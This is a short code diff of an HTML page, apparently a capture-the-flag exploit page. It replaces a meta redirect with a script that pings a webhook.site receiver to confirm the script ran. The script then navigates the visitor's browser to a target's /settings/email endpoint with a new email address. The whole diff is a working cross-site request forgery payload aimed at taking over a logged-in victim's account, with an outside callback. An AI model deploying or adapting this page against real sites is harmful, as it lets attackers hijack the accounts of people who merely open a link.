@@ -3,11 +3,25 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Navigation Test</title>
-    <meta http-equiv="refresh"
-          content="0;url=http://tpas-be.tail9b2a2.ts.net:6009/settings/email?new=prueba%40example.com">
+    <title>Navigation Diagnostic</title>
 </head>
 <body>
     <p>Redirecting...</p>
+
+    <script>
+        const receiver =
+          "https://webhook.site/6e5173ff-6f86-45cf-96ef-426d4f3d8d11";
+
+        // Señal de que JavaScript se ejecutó.
+        const img = new Image();
+        img.src = receiver + "?stage=javascript";
+
+        // Navegación principal hacia el reto.
+        setTimeout(() => {
+            window.location.assign(
+              "http://tpas-be.tail9b2a2.ts.net:6009/settings/email?new=prueba%40example.com"
+            );
+        }, 1500);
+    </script>
 </body>
 </html>
